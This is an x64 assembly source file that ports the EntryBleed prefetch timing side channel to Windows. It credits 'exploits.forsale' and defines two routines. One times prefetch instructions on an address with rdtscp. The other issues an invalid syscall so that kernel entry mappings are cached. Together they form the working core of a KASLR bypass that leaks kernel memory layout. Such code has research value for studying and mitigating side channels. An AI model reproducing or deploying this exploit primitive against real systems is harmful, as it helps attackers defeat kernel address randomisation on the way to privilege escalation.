; -----------------------------------------------------------------------------------------------------------	
; based on entrybleed (https://www.willsroot.io/2022/12/entrybleed.html)
; adapted to windows by exploits.forsale
; assembly based on example by Elias Bachaalany <lallousz-x86@yahoo.com> http://lallouslab.net


; -----------------------------------------------------------------------------------------------------------	
; Exported symbols
PUBLIC sidechannel
PUBLIC bad_syscall

; -----------------------------------------------------------------------------------------------------------	
; Text segment
; -----------------------------------------------------------------------------------------------------------	
_TEXT	SEGMENT


sidechannel PROC
	push rbx
	push rsi
	push rdi
	mov rsi, rcx ; save the address away

	mfence
	rdtscp
	mov r9, rax
	mov r8, rdx
	xor rax, rax
	lfence

	prefetchnta byte ptr [rsi]
	prefetcht2 byte ptr [rsi]

	lfence
	rdtscp
	mov rdi, rax
	mov rsi, rdx

	mfence

	mov rbx, r8
	shl rbx, 32
	or rbx, r9

	mov rax, rsi
	shl rax, 32
	or rax, rdi

	sub rax, rbx
	pop rdi
	pop rsi
	pop rbx
	ret
sidechannel ENDP

bad_syscall PROC
	mov rax, 99999
	syscall
	ret
bad_syscall ENDP


_TEXT	ENDS

END